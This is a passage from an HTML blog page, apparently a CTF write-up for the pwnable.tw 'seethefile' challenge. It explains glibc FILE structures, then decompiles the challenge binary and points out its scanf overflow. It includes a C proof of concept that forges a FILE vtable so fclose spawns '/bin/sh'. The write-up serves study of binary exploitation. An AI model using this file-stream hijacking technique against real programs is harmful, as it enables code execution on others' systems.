@@ -1,0 +1,710 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+<meta content="pwnable.tw - seethefile" property="og:title"/>
+<meta content="article" property="og:type"/>
+<meta content="2020-03-29T01:23:36.608Z" property="og:published_time"/>
+<meta content="2020-03-30T08:23:31.139Z" property="og:modified_time"/>
+<meta content="Srikavin Ramkumar" property="og:author"/>
+<meta content="ctf-writeups" property="og:section"/>
+<meta content="pwnable.tw" property="og:tag"/>
+<meta content="binary-exploitation" property="og:tag"/>
+<meta content="file-stream-oriented-programming" property="og:tag"/>
+<meta content="pwntools" property="og:tag"/>
+<meta content="/posts/pwnable-tw-seethefile/" property="og:url"/>
+
+    <title>pwnable.tw - seethefile - srikavin.me</title>
+    <link rel="stylesheet" href="/bundle.css">
+</head>
+
+<body>
+<nav>
+    <div class="nav-left">
+        <span>
+            <a href="https://srikavin.me" class="name">Srikavin Ramkumar</a>
+        </span>
+        <span>
+            <a href="/posts" class="nav-link">Posts</a>
+        </span>
+        <span>
+            <a class="nav-link" href="/tags">Tags</a>
+        </span>
+    </div>
+</nav>
+<section class="section">
+    <div class="container">
+        
+
+<div class="blog-container">
+    
+
+
+<div class="blog-header">
+    <h1 class="title">
+        
+        pwnable.tw - seethefile
+        
+    </h1>
+    <div class="subtitle">
+                    <span>Posted on
+                        <span class="date" title="Created: 2020-03-29T01:23:36.608Z&#10;Updated: 2020-03-30T08:23:31.139Z">March 29, 2020*
+                        </span>
+
+                        in ctf-writeups
+                        
+                </span>
+    </div>
+    <div class="tags">
+        
+        
+        <a href="&#x2F;tags&#x2F;pwnable-tw&#x2F;"><span class="tag minimal interactive">pwnable.tw</span></a>
+        
+        
+        <a href="&#x2F;tags&#x2F;binary-exploitation&#x2F;"><span class="tag minimal interactive">binary-exploitation</span></a>
+        
+        
+        <a href="&#x2F;tags&#x2F;file-stream-oriented-programming&#x2F;"><span class="tag minimal interactive">file-stream-oriented-programming</span></a>
+        
+        
+        <a href="&#x2F;tags&#x2F;pwntools&#x2F;"><span class="tag minimal interactive">pwntools</span></a>
+        
+    </div>
+</div>
+
+
+<div class="blog-content light">
+    <div class="blog-scrollspy">
+        <h1 class="scrollspy-label">Table of Contents</h1>
+        <ul>
+            
+            <li>
+                <a data-target="challenge" href="#challenge">Challenge</a>
+                
+            </li>
+            
+            <li>
+                <a data-target="background" href="#background">Background</a>
+                
+                <ul>
+                    
+                    <li>
+                        <a data-target="io-file-plus" href="#io-file-plus">_IO_FILE_plus</a>
+                        
+                    </li>
+                    
+                    <li>
+                        <a data-target="io-file" href="#io-file">_IO_FILE</a>
+                        
+                    </li>
+                    
+                    <li>
+                        <a data-target="io-jump-t-vtable" href="#io-jump-t-vtable">_IO_jump_t (vtable)</a>
+                        
+                    </li>
+                    
+                    <li>
+                        <a data-target="attacking-files-file-stream-oriented-programming" href="#attacking-files-file-stream-oriented-programming">Attacking FILEs (File-Stream Oriented Programming)</a>
+                        
+                    </li>
+                    
+                </ul>
+                
+            </li>
+            
+            <li>
+                <a data-target="reversing" href="#reversing">Reversing</a>
+                
+                <ul>
+                    
+                    <li>
+                        <a data-target="main" href="#main">main</a>
+                        
+                    </li>
+                    
+                    <li>
+                        <a data-target="openfile" href="#openfile">openfile</a>
+                        
+                    </li>
+                    
+                    <li>
+                        <a data-target="readfile" href="#readfile">readfile</a>
+                        
+                    </li>
+                    
+                    <li>
+                        <a data-target="writefile" href="#writefile">writefile</a>
+                        
+                    </li>
+                    
+                    <li>
+                        <a data-target="closefile" href="#closefile">closefile</a>
+                        
+                    </li>
+                    
+                </ul>
+                
+            </li>
+            
+            <li>
+                <a data-target="attacking-the-program" href="#attacking-the-program">Attacking the Program</a>
+                
+                <ul>
+                    
+                    <li>
+                        <a data-target="leaking-libc-base" href="#leaking-libc-base">Leaking libc base</a>
+                        
+                    </li>
+                    
+                    <li>
+                        <a data-target="faking-a-file-struct" href="#faking-a-file-struct">Faking a FILE struct</a>
+                        
+                        <ul>
+                            
+                            <li>
+                                <a data-target="choosing-the-flags" href="#choosing-the-flags">Choosing the flags</a>
+                            </li>
+                            
+                            <li>
+                                <a data-target="bypassing-the-lock" href="#bypassing-the-lock">Bypassing the lock</a>
+                            </li>
+                            
+                        </ul>
+                        
+                    </li>
+                    
+                    <li>
+                        <a data-target="overview" href="#overview">Overview</a>
+                        
+                    </li>
+                    
+                    <li>
+                        <a data-target="final-script" href="#final-script">Final Script</a>
+                        
+                    </li>
+                    
+                </ul>
+                
+            </li>
+            
+            <li>
+                <a data-target="further-reading" href="#further-reading">Further Reading</a>
+                
+            </li>
+            
+        </ul>
+    </div>
+
+    <h1 id="challenge">Challenge</h1>
+<blockquote>
+<p>Can you see anything?</p>
+<p>Get a shell for me.</p>
+<p><code>nc chall.pwnable.tw 10200</code></p>
+<p><a href="https://pwnable.tw/static/chall/seethefile">seethefile</a></p>
+<p><a href="https://pwnable.tw/static/libc/libc_32.so.6">libc.so</a></p>
+</blockquote>
+<h1 id="background">Background</h1>
+<h2 id="io-file-plus">_IO_FILE_plus</h2>
+<p>Files are internally represented using the <a href="https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/libioP.h#L342"><code>_IO_FILE_plus</code></a> struct in glibc:</p>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">struct </span><span style="color:#323232;">_IO_FILE_plus
+{
+  _IO_FILE file;
+  </span><span style="font-weight:bold;color:#a71d5d;">const struct </span><span style="color:#323232;">_IO_jump_t *vtable;
+};
+</span></code></pre><span id="continue-reading"></span>
+<p>This struct is cast to an opaque <code>FILE</code> pointer and returned from <code>fopen</code>. </p>
+<h2 id="io-file">_IO_FILE</h2>
+<p>The <a href="https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/libio.h#L241"><code>_IO_FILE</code></a> struct contains buffered data and other details about a file:</p>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">struct </span><span style="color:#323232;">_IO_FILE {
+  </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> _flags;		</span><span style="font-style:italic;color:#969896;">/* High-order word is _IO_MAGIC; rest is flags. */
+</span><span style="font-weight:bold;color:#a71d5d;">#define </span><span style="color:#323232;">_IO_file_flags _flags
+
+  </span><span style="font-style:italic;color:#969896;">/* The following pointers correspond to the C++ streambuf protocol. */
+  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
+  </span><span style="font-weight:bold;color:#a71d5d;">char*</span><span style="color:#323232;"> _IO_read_ptr;	</span><span style="font-style:italic;color:#969896;">/* Current read pointer */
+  </span><span style="font-weight:bold;color:#a71d5d;">char*</span><span style="color:#323232;"> _IO_read_end;	</span><span style="font-style:italic;color:#969896;">/* End of get area. */
+  </span><span style="font-weight:bold;color:#a71d5d;">char*</span><span style="color:#323232;"> _IO_read_base;	</span><span style="font-style:italic;color:#969896;">/* Start of putback+get area. */
+  </span><span style="font-weight:bold;color:#a71d5d;">char*</span><span style="color:#323232;"> _IO_write_base;	</span><span style="font-style:italic;color:#969896;">/* Start of put area. */
+  </span><span style="font-weight:bold;color:#a71d5d;">char*</span><span style="color:#323232;"> _IO_write_ptr;	</span><span style="font-style:italic;color:#969896;">/* Current put pointer. */
+  </span><span style="font-weight:bold;color:#a71d5d;">char*</span><span style="color:#323232;"> _IO_write_end;	</span><span style="font-style:italic;color:#969896;">/* End of put area. */
+  </span><span style="font-weight:bold;color:#a71d5d;">char*</span><span style="color:#323232;"> _IO_buf_base;	</span><span style="font-style:italic;color:#969896;">/* Start of reserve area. */
+  </span><span style="font-weight:bold;color:#a71d5d;">char*</span><span style="color:#323232;"> _IO_buf_end;	</span><span style="font-style:italic;color:#969896;">/* End of reserve area. */
+  /* The following fields are used to support backing up and undo. */
+  </span><span style="font-weight:bold;color:#a71d5d;">char *</span><span style="color:#323232;">_IO_save_base; </span><span style="font-style:italic;color:#969896;">/* Pointer to start of non-current get area. */
+  </span><span style="font-weight:bold;color:#a71d5d;">char *</span><span style="color:#323232;">_IO_backup_base;  </span><span style="font-style:italic;color:#969896;">/* Pointer to first valid character of backup area */
+  </span><span style="font-weight:bold;color:#a71d5d;">char *</span><span style="color:#323232;">_IO_save_end; </span><span style="font-style:italic;color:#969896;">/* Pointer to end of non-current get area. */
+
+  </span><span style="font-weight:bold;color:#a71d5d;">struct </span><span style="color:#323232;">_IO_marker *_markers;
+
+  </span><span style="font-weight:bold;color:#a71d5d;">struct</span><span style="color:#323232;"> _IO_FILE *_chain;
+  
+  </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> _fileno;
+  </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> _flags2;
+  _IO_off_t _old_offset; </span><span style="font-style:italic;color:#969896;">/* This used to be _offset but it&#39;s too small.  */
+
+</span><span style="font-weight:bold;color:#a71d5d;">#define </span><span style="color:#323232;">__HAVE_COLUMN </span><span style="font-style:italic;color:#969896;">/* temporary */
+  /* 1+column number of pbase(); 0 is unknown. */
+  </span><span style="font-weight:bold;color:#a71d5d;">unsigned short</span><span style="color:#323232;"> _cur_column;
+  </span><span style="font-weight:bold;color:#a71d5d;">signed char</span><span style="color:#323232;"> _vtable_offset;
+  </span><span style="font-weight:bold;color:#a71d5d;">char</span><span style="color:#323232;"> _shortbuf[</span><span style="color:#0086b3;">1</span><span style="color:#323232;">];
+
+  </span><span style="font-style:italic;color:#969896;">/*  char* _save_gptr;  char* _save_egptr; */</span><span style="color:#323232;">
+
+  _IO_lock_t </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">_lock;
+};
+</span></code></pre><h2 id="io-jump-t-vtable">_IO_jump_t (vtable)</h2>
+<p>Even more interestingly, the <code>_IO_FILE_plus</code> struct contains a field named <code>vtable</code>. This field acts as a jump table 
+containing virtual functions that are used when interacting with the file.</p>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">struct </span><span style="color:#323232;">_IO_jump_t
+{
+    JUMP_FIELD(</span><span style="color:#0086b3;">size_t</span><span style="color:#323232;">, __dummy);
+    JUMP_FIELD(</span><span style="color:#0086b3;">size_t</span><span style="color:#323232;">, __dummy2);
+    JUMP_FIELD(_IO_finish_t, __finish);
+    JUMP_FIELD(_IO_overflow_t, __overflow);
+    JUMP_FIELD(_IO_underflow_t, __underflow);
+    JUMP_FIELD(_IO_underflow_t, __uflow);
+    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
+    </span><span style="font-style:italic;color:#969896;">/* showmany */
+    </span><span style="color:#323232;">JUMP_FIELD(_IO_xsputn_t, __xsputn);
+    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
+    JUMP_FIELD(_IO_seekoff_t, __seekoff);
+    JUMP_FIELD(_IO_seekpos_t, __seekpos);
+    JUMP_FIELD(_IO_setbuf_t, __setbuf);
+    JUMP_FIELD(_IO_sync_t, __sync);
+    JUMP_FIELD(_IO_doallocate_t, __doallocate);
+    JUMP_FIELD(_IO_read_t, __read);
+    JUMP_FIELD(_IO_write_t, __write);
+    JUMP_FIELD(_IO_seek_t, __seek);
+    JUMP_FIELD(_IO_close_t, __close);
+    JUMP_FIELD(_IO_stat_t, __stat);
+    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
+    JUMP_FIELD(_IO_imbue_t, __imbue);
+};
+</span></code></pre>
+<p>For example, when <code>fclose(FILE *ptr)</code> is called, the function pointer stored in the <code>__finish</code>  field in the struct will 
+be called after freeing internal structures. </p>
+<h2 id="attacking-files-file-stream-oriented-programming">Attacking FILEs (File-Stream Oriented Programming)</h2>
+<p>If we are able to call file-related functions (fclose, fread, etc.) on a pointer we can redirect execution by creating 
+entries in the <code>vtable</code> field in <code>_IO_FILE_plus</code>. I created an example program to demonstrate an attack by creating a 
+fake <code>FILE</code> struct:</p>
+<pre style="background-color:#ffffff;">
+<code><span style="font-style:italic;color:#969896;">// gcc -m32 test.c -o test
+
+</span><span style="font-weight:bold;color:#a71d5d;">#include </span><span style="color:#183691;">&lt;stdio.h&gt;
+</span><span style="font-weight:bold;color:#a71d5d;">#include </span><span style="color:#183691;">&lt;stdlib.h&gt;
+
+</span><span style="font-weight:bold;color:#a71d5d;">void*</span><span style="color:#323232;"> vtable[] </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">{
+    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(size_t, __dummy);
+    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(size_t, __dummy2);
+    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_finish_t, __finish);
+    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_overflow_t, __overflow);
+    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_underflow_t, __underflow);
+    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_underflow_t, __uflow);
+    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
+    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_xsputn_t, __xsputn);
+    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
+    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_seekoff_t, __seekoff);
+    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_seekpos_t, __seekpos);
+    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_setbuf_t, __setbuf);
+    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_sync_t, __sync);
+    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_doallocate_t, __doallocate);
+    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_read_t, __read);
+    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_write_t, __write);
+    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_seek_t, __seek);
+</span><span style="color:#323232;">    system,  </span><span style="font-style:italic;color:#969896;">// JUMP_FIELD(_IO_close_t, __close);
+    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_stat_t, __stat);
+    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
+    </span><span style="color:#0086b3;">NULL  </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_imbue_t, __imbue);
+</span><span style="color:#323232;">};
+
+</span><span style="font-weight:bold;color:#a71d5d;">int </span><span style="font-weight:bold;color:#795da3;">main</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">int </span><span style="color:#323232;">argc, </span><span style="font-weight:bold;color:#a71d5d;">char** </span><span style="color:#323232;">argv) {
+    </span><span style="font-style:italic;color:#969896;">// Creates a file and overwrites the vtable field in the FILE struct
+</span><span style="color:#323232;">    FILE </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">fp </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">fopen</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;/dev/null&quot;</span><span style="color:#323232;">, </span><span style="color:#183691;">&quot;r&quot;</span><span style="color:#323232;">);
+    </span><span style="color:#0086b3;">size_t </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">vtable_addr </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">((</span><span style="font-weight:bold;color:#a71d5d;">void *</span><span style="color:#323232;">) fp) </span><span style="font-weight:bold;color:#a71d5d;">+ sizeof</span><span style="color:#323232;">(FILE);
+
+    </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">vtable_addr </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">(</span><span style="color:#0086b3;">size_t </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">)vtable;
+
+    </span><span style="font-style:italic;color:#969896;">// Moves &quot;/bin/sh\x00&quot; to the start of the file pointer.
+    // When system is called, it will interpret the FILE* as a char*, which
+    // means that the interpreted string will be &quot;/bin/sh&quot; due to the null byte.
+    </span><span style="color:#62a35c;">strcpy</span><span style="color:#323232;">(fp, </span><span style="color:#183691;">&quot;/bin/sh</span><span style="color:#0086b3;">\x00</span><span style="color:#183691;">&quot;</span><span style="color:#323232;">);
+
+    </span><span style="font-style:italic;color:#969896;">// Calls system with the FILE pointer as an argument. This should create
+    // a shell.
+    </span><span style="color:#62a35c;">fclose</span><span style="color:#323232;">(fp);
+
+    </span><span style="font-weight:bold;color:#a71d5d;">return </span><span style="color:#0086b3;">0</span><span style="color:#323232;">;
+}
+</span></code></pre>
+<p>Running this test program gives us a shell and then segfaults:
+<img src="/posts/pwnable-tw-seethefile/5e80319b0f5e61083b61b4a9.png" alt="" /></p>
+<h1 id="reversing">Reversing</h1>
+<p>Reversing the program is made easy by cross-referencing the program's behavior with Ghidra.</p>
+<h2 id="main">main</h2>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">int </span><span style="font-weight:bold;color:#795da3;">main</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">int </span><span style="color:#323232;">argc,</span><span style="font-weight:bold;color:#a71d5d;">char **</span><span style="color:#323232;">argv){
+  </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> input;
+  </span><span style="font-weight:bold;color:#a71d5d;">char</span><span style="color:#323232;"> input_str [</span><span style="color:#0086b3;">32</span><span style="color:#323232;">];
+  
+  init();
+  welcome();
+  </span><span style="font-weight:bold;color:#a71d5d;">do </span><span style="color:#323232;">{
+    menu();
+    __isoc99_scanf(</span><span style="color:#183691;">&quot;</span><span style="color:#0086b3;">%s</span><span style="color:#183691;">&quot;</span><span style="color:#323232;">,input_str);
+    input </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">atoi</span><span style="color:#323232;">(input_str);
+    </span><span style="font-weight:bold;color:#a71d5d;">switch</span><span style="color:#323232;">(input) {
+    </span><span style="font-weight:bold;color:#a71d5d;">default</span><span style="color:#323232;">:
+      </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Invaild choice&quot;</span><span style="color:#323232;">);
+                    </span><span style="font-style:italic;color:#969896;">/* WARNING: Subroutine does not return */
+      </span><span style="color:#62a35c;">exit</span><span style="color:#323232;">(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">);
+    </span><span style="font-weight:bold;color:#a71d5d;">case </span><span style="color:#0086b3;">1</span><span style="color:#323232;">:
+      openfile();
+      </span><span style="font-weight:bold;color:#a71d5d;">break</span><span style="color:#323232;">;
+    </span><span style="font-weight:bold;color:#a71d5d;">case </span><span style="color:#0086b3;">2</span><span style="color:#323232;">:
+      readfile();
+      </span><span style="font-weight:bold;color:#a71d5d;">break</span><span style="color:#323232;">;
+    </span><span style="font-weight:bold;color:#a71d5d;">case </span><span style="color:#0086b3;">3</span><span style="color:#323232;">:
+      writefile();
+      </span><span style="font-weight:bold;color:#a71d5d;">break</span><span style="color:#323232;">;
+    </span><span style="font-weight:bold;color:#a71d5d;">case </span><span style="color:#0086b3;">4</span><span style="color:#323232;">:
+      closefile();
+      </span><span style="font-weight:bold;color:#a71d5d;">break</span><span style="color:#323232;">;
+    </span><span style="font-weight:bold;color:#a71d5d;">case </span><span style="color:#0086b3;">5</span><span style="color:#323232;">:
+      </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Leave your name :&quot;</span><span style="color:#323232;">);
+                    </span><span style="font-style:italic;color:#969896;">/* can overwrite fp */
+      </span><span style="color:#323232;">__isoc99_scanf(</span><span style="color:#183691;">&quot;</span><span style="color:#0086b3;">%s</span><span style="color:#183691;">&quot;</span><span style="color:#323232;">,name);
+      </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Thank you </span><span style="color:#0086b3;">%s</span><span style="color:#183691;"> ,see you next time</span><span style="color:#0086b3;">\n</span><span style="color:#183691;">&quot;</span><span style="color:#323232;">,name);
+      </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(fp </span><span style="font-weight:bold;color:#a71d5d;">!= </span><span style="color:#323232;">(FILE </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">) {
+        </span><span style="color:#62a35c;">fclose</span><span style="color:#323232;">(fp);
+      }
+                    </span><span style="font-style:italic;color:#969896;">/* WARNING: Subroutine does not return */
+      </span><span style="color:#62a35c;">exit</span><span style="color:#323232;">(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">);
+    }
+  } </span><span style="font-weight:bold;color:#a71d5d;">while</span><span style="color:#323232;">( </span><span style="color:#0086b3;">true </span><span style="color:#323232;">);
+}
+</span></code></pre>
+<p>The use of <code>scanf</code> without a maximum width specified allows for a buffer overflow attack in the .bss section. Overflowing 
+the <code>name</code> buffer allows us to overwrite <code>FILE *fp</code>. </p>
+<h2 id="openfile">openfile</h2>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">int </span><span style="font-weight:bold;color:#795da3;">openfile</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">void</span><span style="color:#323232;">){
+  </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> iVar1;
+  </span><span style="font-weight:bold;color:#a71d5d;">char *</span><span style="color:#323232;">pcVar2;
+  
+  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(fp </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#323232;">(FILE </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">) {
+    </span><span style="color:#62a35c;">memset</span><span style="color:#323232;">(filebuf,</span><span style="color:#0086b3;">0</span><span style="color:#323232;">,</span><span style="color:#0086b3;">400</span><span style="color:#323232;">);
+    </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;What do you want to see :&quot;</span><span style="color:#323232;">);
+    __isoc99_scanf(</span><span style="color:#183691;">&quot;</span><span style="color:#0086b3;">%63s</span><span style="color:#183691;">&quot;</span><span style="color:#323232;">,filename);
+    pcVar2 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">strstr</span><span style="color:#323232;">(filename,</span><span style="color:#183691;">&quot;flag&quot;</span><span style="color:#323232;">);
+    </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(pcVar2 </span><span style="font-weight:bold;color:#a71d5d;">!= </span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">char *</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">) {
+      </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Danger !&quot;</span><span style="color:#323232;">);
+                    </span><span style="font-style:italic;color:#969896;">/* WARNING: Subroutine does not return */
+      </span><span style="color:#62a35c;">exit</span><span style="color:#323232;">(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">);
+    }
+    fp </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">fopen</span><span style="color:#323232;">(filename,</span><span style="color:#183691;">&quot;r&quot;</span><span style="color:#323232;">);
+    </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(fp </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#323232;">(FILE </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">) {
+      iVar1 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Open failed&quot;</span><span style="color:#323232;">);
+    }
+    </span><span style="font-weight:bold;color:#a71d5d;">else </span><span style="color:#323232;">{
+      iVar1 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Open Successful&quot;</span><span style="color:#323232;">);
+    }
+  }
+  </span><span style="font-weight:bold;color:#a71d5d;">else </span><span style="color:#323232;">{
+    </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;You need to close the file first&quot;</span><span style="color:#323232;">);
+    iVar1 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">0</span><span style="color:#323232;">;
+  }
+  </span><span style="font-weight:bold;color:#a71d5d;">return</span><span style="color:#323232;"> iVar1;
+}
+</span></code></pre>
+<p>This opens any file without <code>flag</code> in its name and stores its file descriptor (<code>FILE *</code>) in <code>fp</code>.</p>
+<h2 id="readfile">readfile</h2>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">void </span><span style="font-weight:bold;color:#795da3;">readfile</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">void</span><span style="color:#323232;">){
+  </span><span style="color:#0086b3;">size_t </span><span style="color:#323232;">sVar1;
+  
+  </span><span style="color:#62a35c;">memset</span><span style="color:#323232;">(filebuf,</span><span style="color:#0086b3;">0</span><span style="color:#323232;">,</span><span style="color:#0086b3;">400</span><span style="color:#323232;">);
+  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(fp </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#323232;">(FILE </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">) {
+    </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;You need to open a file first&quot;</span><span style="color:#323232;">);
+  }
+  </span><span style="font-weight:bold;color:#a71d5d;">else </span><span style="color:#323232;">{
+    sVar1 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">fread</span><span style="color:#323232;">(filebuf,</span><span style="color:#0086b3;">399</span><span style="color:#323232;">,</span><span style="color:#0086b3;">1</span><span style="color:#323232;">,fp);
+    </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(sVar1 </span><span style="font-weight:bold;color:#a71d5d;">!= </span><span style="color:#0086b3;">0</span><span style="color:#323232;">) {
+      </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Read Successful&quot;</span><span style="color:#323232;">);
+    }
+  }
+  </span><span style="font-weight:bold;color:#a71d5d;">return</span><span style="color:#323232;">;
+}
+</span></code></pre>
+<p>This reads the next 399 characters of the previously opened file into a buffer in memory.</p>
+<h2 id="writefile">writefile</h2>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">void </span><span style="font-weight:bold;color:#795da3;">writefile</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">void</span><span style="color:#323232;">) {
+  </span><span style="font-weight:bold;color:#a71d5d;">char *</span><span style="color:#323232;">pcVar1;
+  
+  pcVar1 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">strstr</span><span style="color:#323232;">(filename,</span><span style="color:#183691;">&quot;flag&quot;</span><span style="color:#323232;">);
+  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(pcVar1 </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">char *</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">) {
+    pcVar1 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">strstr</span><span style="color:#323232;">(filebuf,</span><span style="color:#183691;">&quot;FLAG&quot;</span><span style="color:#323232;">);
+    </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(pcVar1 </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">char *</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">) {
